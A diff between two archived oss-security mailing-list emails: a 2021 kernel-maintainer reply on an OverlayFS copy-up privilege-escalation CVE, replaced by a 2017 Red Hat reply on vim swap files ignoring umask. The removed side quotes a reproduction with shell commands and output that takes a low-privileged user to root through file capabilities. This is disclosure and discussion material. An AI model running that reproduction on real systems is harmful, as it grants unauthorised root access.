@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5873" "Tuesday" "19" "October" "2021" "17:23:27" "+0200" "Miklos Szeredi" "miklos@szeredi.hu" nil "126" "Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up" nil nil nil "10" nil nil (number mark "U       miklos@szere Oct 19  126/5873  " thread-indent "\"Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2980" "Thursday" "2" "November" "2017" "19:08:57" "-0600" "Kurt Seifried" "kseifried@redhat.com" "<CANO=Ty1HsCH2q1CQBgz0Fap=sBzjUPPfBxMMtVY5T3YFL90_Ag@mail.gmail.com>" "76" "Re: [oss-security] Re: Fw: Security risk of vim swap files" "^Date:" nil nil "11" "2017110301:08:57" "[oss-security] Re: Fw: Security risk of vim swap files" (number mark "        kseifried@re Nov  2   76/2980  " thread-indent "\"Re: [oss-security] Re: Fw: Security risk of vim swap files\"\n") "<20171102212916.GC23769@256bit.org>" ("<20171102212916.GC23769@256bit.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 23849 invoked by uid 550); 19 Oct 2021 15:31:04 -0000
+Received: (qmail 26036 invoked by uid 550); 3 Nov 2017 01:09:11 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,176 +11,107 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 17972 invoked from network); 19 Oct 2021 15:26:02 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=szeredi.hu; s=google;
-        h=date:from:to:cc:subject:message-id:references:mime-version
-         :content-disposition:content-transfer-encoding:in-reply-to;
-        bh=MZgniYHas0G8uMpaAIYxjaFr/MQdHHdVlrH0fW6i6VU=;
-        b=kikRDXXO//5oWFd0HxBCxAHfmNAvweGQLARgqO1XAM76kgovdBlz+K+gfFWHjMjWWc
-         4QuxtIjTL5JXfhF0Yl5IYLVwbZYFXWOQVbKCt+Yyunn3z8TABEdL6Il3UoGC4/sHGsRp
-         v4xhswV/4+02U8WvBoq5KGhEtQkTaDzFCTnrc=
+Received: (qmail 26006 invoked from network); 3 Nov 2017 01:09:10 -0000
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=x-gm-message-state:date:from:to:cc:subject:message-id:references
-         :mime-version:content-disposition:content-transfer-encoding
-         :in-reply-to;
-        bh=MZgniYHas0G8uMpaAIYxjaFr/MQdHHdVlrH0fW6i6VU=;
-        b=jGt8UieajFTZaEIqMk4sHs8LoAcxaDY8WEYNIoWoJ2C/kQqSv7UEyVx1ZZmuu5WhmY
-         QQDZy5KYiCP67qM7og/qWedHs7Khk8UN9izxrLtsxKl54fuTGgV+Ce2DBJN25g1mzYVx
-         978HQBcOmQNuF1WMIYkz1oGnt0N0yvycrsE2KoQIsUkQ3O4WHez93eQRY5w0urPxP3Lg
-         UVAMaK07YF7CL3x6UPpBTjTuF5CWFhu22Neyzq5WzBUOLOXIyn6cfJHgYsdIYzg5Cqh6
-         VFm//ipuZniov0C4grGLomHe3/QugHeSK4mBGg5RQ6Ccf5qBKEV9WIOtZd167hHotKRL
-         X43w==
-X-Gm-Message-State: AOAM531i0t1VZ2zLaJB3ZbyBFhQkTXe5zvoOtmlIkO/akhYXNl2txtI5
-	T3qf1Qeay/IG5xmgbTytcreqhOFT6hGCNw==
-X-Google-Smtp-Source: ABdhPJxflk94TgsCYNCviF0dh0QHT8wwWTznQc8FeBreEiI/gHxpqdWHMP1PdH73T2CLuQBBoZrUmg==
-X-Received: by 2002:a17:906:8397:: with SMTP id p23mr40129688ejx.43.1634657016553;
-        Tue, 19 Oct 2021 08:23:36 -0700 (PDT)
-Date: Tue, 19 Oct 2021 17:23:27 +0200
-From: Miklos Szeredi <miklos@szeredi.hu>
-To: oss-security@lists.openwall.com
-Cc: linux-fsdevel@vger.kernel.org, linux-unionfs@vger.kernel.org,
-	Alon Zahavi <Alon.Zahavi@cyberark.com>,
-	Vegard Nossum <vegard.nossum@oracle.com>,
-	Thadeu Lima de Souza Cascardo <cascardo@canonical.com>,
-	Nir Chako <Nir.Chako@cyberark.com>,
-	Alon Zahavi <zahavi.alon@gmail.com>
-Message-ID: <YW7i72bOgRGmCs2O@miu.piliscsaba.redhat.com>
-References: <DB9P193MB140461EEF44F153D9F66FF958DB89@DB9P193MB1404.EURP193.PROD.OUTLOOK.COM>
- <PAXP193MB1405A3EC41713BE9D524FBE48DB89@PAXP193MB1405.EURP193.PROD.OUTLOOK.COM>
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
+         :message-id:subject:to;
+        bh=AGyivVNHiX2CHPM990IggxVVORigBLU5iz9aPl9YOTk=;
+        b=mGJqvp04jQKGzlHxywptQeTG2NN8RAhZTr5GGPR9VZugpzZnurHzr2H0SJLVfMvqBU
+         CGBVy1lmjCBWxZzi+JBkw//c3NedxAI0kRdCEAMMsMa6B218ffMIomHBycccm0Mjv8Ee
+         iwyriv9gK0LzB97ooH9c2+pZYLxOl0buYyR3reXPZFL0wk3iOEfeSI2XsDDN7nnLnsYL
+         BuzT2xC1gCr5DN1tAnyvUjF1wsN9xSSpxfBCHolUglbwQ29AMyA7Rp+ySThhgqAYBzlk
+         nV3+2Sn8ScuoTTd1hrC1WJu21DT8MmMoqnGvPGPwzz8UsaWCza0oEZ/JtMyyiXDfRg1H
+         mCwA==
+X-Gm-Message-State: AJaThX5GZHjEpeI5jJAxjXsHTVpAqzX/SkfoSQ/ws1YrSd5Eg/aTfTlg
+	rIhI24Ox77YI9lozAOPBhzLHHSFxqgJndUeLtZGwlknq
+X-Google-Smtp-Source: ABhQp+RD44FAdItDJ8oH9WHc8ok7GlMkMnGQyxLBnqYx1XOzTJwJWxoNuZT/se3AQgYBjvOI9xcwz4c4RZOpmD/0f5Y=
+X-Received: by 10.157.65.132 with SMTP id p4mr3247018ote.281.1509671338716;
+ Thu, 02 Nov 2017 18:08:58 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-Content-Transfer-Encoding: 8bit
-In-Reply-To: <PAXP193MB1405A3EC41713BE9D524FBE48DB89@PAXP193MB1405.EURP193.PROD.OUTLOOK.COM>
-Subject: Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege
- Escalation using overlays copy_up
+In-Reply-To: <20171102212916.GC23769@256bit.org>
+References: <20171102212916.GC23769@256bit.org>
+Message-ID: <CANO=Ty1HsCH2q1CQBgz0Fap=sBzjUPPfBxMMtVY5T3YFL90_Ag@mail.gmail.com>
+Content-Type: multipart/alternative; boundary="94eb2c1c1478df50c6055d09bf58"
+Date: Thu, 2 Nov 2017 19:08:57 -0600
+From: Kurt Seifried <kseifried@redhat.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] Re: Fw: Security risk of vim swap files
+To: oss-security <oss-security@lists.openwall.com>
 
-On Thu, Oct 14, 2021 at 06:30:53PM +0000, Alon Zahavi wrote:
-> 
-> After disclosing the issue with the linux-distros mailing list, I am reporting the security issue publicly to here.
-> There is no patch available and may not be available for a long time because the kernel can’t enforce the mitigation proposed, as that would be a layering violation and could also possibly cause a regression.
-> This vulnerability was attached with CVE-2021-3847.
-> Here is the report that was initially sent:
-> 
-> ## Bug Class
-> Escalation of privileges - Bypassing the security extended attribute attachment restrictions (in order to modify the security.capability xattr, a process will need CAP_SYS_ADMIN or CAP_SETFCAP).
-> # Technical Details
-> ## Summary:
-> An attacker with a low-privileged user on a Linux machine with an overlay mount which has a file capability in one of its layers may escalate his privileges up to root when copying a capable file from a nosuid mount into another mount.
-> ## In details:
-> If there is an overlay mount that one of its lower layers contains a file with capabilities and in case that the lower layer is a nosuid mount (which means the file capabilities are being ignored at execution), an attacker with low-privileges user can touch the file, which causes the overlayFS driver to copy_up the file with its capabilities into the upper layer. That way the attacker can now execute the file with the file's capabilities, thus escalating its privileges.
+--94eb2c1c1478df50c6055d09bf58
+Content-Type: text/plain; charset="UTF-8"
 
-I think this is a misunderstanding about how overlayfs operates.  Mounting
-overlayfs is effectively a just-in-time version of "cp -a lowerdir upperdir".
-In other words if the admin creates an overlay where the lower layer is
-untrusted and the upper layer is trusted, then that act itself is the
-privilege escalation.
+On Thu, Nov 2, 2017 at 3:29 PM, Christian Brabandt <cb@256bit.org> wrote:
 
-This is more formally documented in "Documentation/filesystems/overlayfs.rst"
-in the "Permission model" section.
+> Kurt Seifried wrote:
+>
+> > There is a flaw here, it appears on some distros that vim (and emacs)
+> will
+> > ignore a user's umask and go with less restrictive file permissions
+> > (ideally you think vi would use the files existing perms, plus any umask
+> > limitations as expected), for example vim failing:
+> >
+> > [kseifrie@...alhost vi]$ umask
+> > 0007
+> > [kseifrie@...alhost vi]$ touch foo
+> > [kseifrie@...alhost vi]$ ls -la
+> > total 8
+> > drwxrwxr-x.  2 kseifrie kseifrie 4096 Oct 31 10:50 .
+> > drwx--x---. 27 kseifrie kseifrie 4096 Oct 31 10:42 ..
+> > -rw-rw----.  1 kseifrie kseifrie    0 Oct 31 10:50 foo
+> > [kseifrie@...alhost vi]$ chmod o+r foo
+> > [kseifrie@...alhost vi]$ ls -la
+> > total 8
+> > drwxrwxr-x.  2 kseifrie kseifrie 4096 Oct 31 10:50 .
+> > drwx--x---. 27 kseifrie kseifrie 4096 Oct 31 10:42 ..
+> > -rw-rw-r--.  1 kseifrie kseifrie    0 Oct 31 10:50 foo
+> > [kseifrie@...alhost vi]$ vi foo
+> >
+> > in another terminal:
+> >
+> > [kseifrie@...alhost vi]$ ls -la
+> > total 12
+> > drwxrwxr-x.  2 kseifrie kseifrie 4096 Oct 31 10:50 .
+> > drwx--x---. 27 kseifrie kseifrie 4096 Oct 31 10:42 ..
+> > -rw-rw-r--.  1 kseifrie kseifrie    0 Oct 31 10:50 foo
+> > -rw-r--r--.  1 kseifrie kseifrie 4096 Oct 31 10:50 .foo.swp
+> >
+> > So vim ignores the umask of the user =(.
+>
+> > So from a CVE perspective we have a situation where a user has explicitly
+> > set a umask (of say 0007) which is to say they've made a security
+> assertion
+> > of "any file I create I want the rwx permissions for "other" removed"
+> which
+> > vim and emacs (and possibly others) are violating when they create swap
+> > files/backups/whatever. To add insult to injury most other utilities that
+> > create a file (e.g. cp, cat, dd) seem to respect umask.
+> >
+> > Please use CVE-2017-1000382 for VIM version 8.0.1187 (and other versions
+> > most likely) ignores umask when creating a swap file
+> > (\"[ORIGINAL_FILENAME].swp\") resulting in files that may be world
+> readable
+> > or otherwise accessible in ways not intended by the user running the vi
+> > binary.
+>
+> Vim copies the permission from the file being edited. Although the swap
+> file is readable by others this does not leak any information here,
+> since the file being edited is already readable by others.
+>
+> Christian
+>
 
-If this model is not clear, then maybe it needs to be spelled out more
-explicitly.  Perhaps even a warning message could be added to the kernel logs
-in case the lower mount is "nosuid".  But IMO erroring out on the copy-up or
-skipping copy up of certain attributes would make the cure worse than the
-disease.
+That's usually true but it doesn't matter because a security assertion made
+via umask is being violated, so it wins a CVE. Also for example if you
+later delete that file and think you're safe the copy is still floating
+around world readable. Or you have something indexing the files and
+ignoring that file type, and the .swp gets indexed, and so on.
 
-Let me know if I'm missing something.
+-- 
 
-Thanks,
-Miklos
+Kurt Seifried -- Red Hat -- Product Security -- Cloud
+PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+Red Hat Product Security contact: secalert@redhat.com
 
-> See attached image.
-> ## Build:
-> Any Linux machine with a support for overlayFS.
-> For example: AWS EC2 Ubuntu 20.04.
-> Mount a device to any folder.
-> Copy any file with capabilities into that folder.
-> Remount the device now with nosuid option.
-> mount an overlayFS mount where there are two layers. Make sure the lower directory is the directory with the capable file.
-> ## Execution:
-> As a low-priv user cd into the merged directory.
-> Execute touch capable_file
-> cd to the upper layer directory.
-> Execute the capable binary.
-> ## Expected Results:
-> When copying a capable file using a low privileges user, the file should be copied without any file capabilities. As the Linux kernel restricts the copying of a file with capabilities, so low-pric user should not be able to achieve this goal.
-> ## Observed Results:
-> The new file that appears in the upper layer directory have the same capabilities as the file that had been copied. This behavior occur probably because the overlay driver's process is the one responsible for the copying, and it copies the whole file with its extended attributes.
-> 
-> 
-> ########## Example ##########
-> # there are two mount in question
-> $ cd /home/user/overlayfs/
-> 
-> $ ls -l
-> drwxr-xr-x 3 user user   4096 Sep 19 14:07 lowerUSB
-> drwxrwxr-x 1 user user   4096 Sep 19 14:06 merge
-> drwxrwxr-x 2 user user   4096 Sep 14 13:32 test
-> drwxrwxr-x 2 user user   4096 Sep 19 14:06 upper
-> drwxrwxr-x 3 user user   4096 Sep 19 14:25 work
-> 
-> # there are two mount in question.
-> # lowerUSB is a mount of an USB, which has a capable file inside.
-> # IMPORTENT NOTE: This mount has "nosuid" option, so capabilities should be ignored while executing it.
-> # The second mount is the overlay mount. Its lower directory is `lowerUSB/` which is the first mount mentioned above. Its upper is just a regular directory on the root fs.
-> $ mount
-> /dev/sdd on /home/user/overlayfs/lowerUSB type ext4 (rw,nosuid,nodev,relatime,uhelper=udisks2)
-> overlay on /home/user/overlayfs/merge type overlay (rw,relatime,lowerdir=lowerUSB,upperdir=upper,workdir=work)
-> 
-> # The contents of all the directories.
-> $ ls -l *
-> lowerUSB:
-> total 40
-> -rwxr-xr-x 1 user user 17104 Sep 13 15:58 escalate
-> drwx------ 2 user user 16384 Jul  5 14:07 lost+found
-> 
-> merge:
-> total 40
-> -rwxr-xr-x 1 user user 17104 Sep 19 14:27 escalate
-> drwx------ 2 user user 16384 Jul  5 14:07 lost+found
-> 
-> test:
-> total 0
-> 
-> upper:
-> total 0
-> 
-> work:
-> total 4
-> d--------- 2 root root 4096 Sep 19 14:25 work
-> 
-> # escalate is an executable that set its uid and gid to 0.
-> $ getcap ./lowerUSB/escalate
-> ./lowerUSB/escalate = cap_setgid,cap_setuid+eip
-> 
-> $ id
-> uid=1000(user) gid=1000(user) groups=1000(user)
-> 
-> # When trying to execute ./lowerUSB/escalate, it does not work because it is a `nosuid` mount.
-> $ ./lowerUSB/escalate
-> [-] Failure
-> 
-> # Try to copy the binary with its capabilities.
-> # It should not work, because regular users are not allowed to copy the "security.capability" xattr.
-> $ cp --preserve=all ./lowerUSB/escalate ./test/escalate
-> cp: setting attribute 'security.capability' for 'security.capability': Operation not permitted
-> 
-> # Trigger the copy_up
-> $ touch ./merge/escalate
-> $ ls -l ./upper/
-> -rwxr-xr-x 1 user user 17K Sep 19 15:01 escalate
-> 
-> # The copy_up kept the binary capabilities (xattr)
-> $ getcap ./upper/escalate
-> ./upper/escalate = cap_setgid,cap_setuid+eip
-> 
-> # executing the binary, with the capabilities, so the privileges will escalate to root.
-> $ ./upper/escalate
-> $ id
-> uid=0(root) gid=0(root) groups=0(root)
-> 
-> 
+--94eb2c1c1478df50c6055d09bf58--
